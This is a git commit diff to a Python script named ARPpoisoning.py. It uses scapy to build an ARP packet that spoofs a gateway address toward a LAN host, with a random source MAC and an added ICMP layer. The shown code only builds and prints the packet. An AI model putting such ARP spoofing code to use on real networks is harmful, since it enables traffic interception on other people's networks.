28d1d08b7ea283151ff71c6ee59df604875196e7
kondy <51909685+2739673455@users.noreply.github.com>
2023-10-05 20:03:23 +0800

    Add files via upload

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -2,8 +2,9 @@ from scapy.all import *
 import time
 
 ether = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff")
-arp = ARP(psrc="192.168.31.1", pdst="192.168.31.215", hwsrc="6a:08:3a:2f:5a:02")
+arp = ARP(psrc="192.168.31.1", pdst="192.168.31.215", hwsrc=RandMAC())
 ip = IP(src="192.168.31.1", dst="192.168.31.215")
+icmp = ICMP()
 # pkt = ether / arp
 pkt = arp / ip
 print(pkt.show())
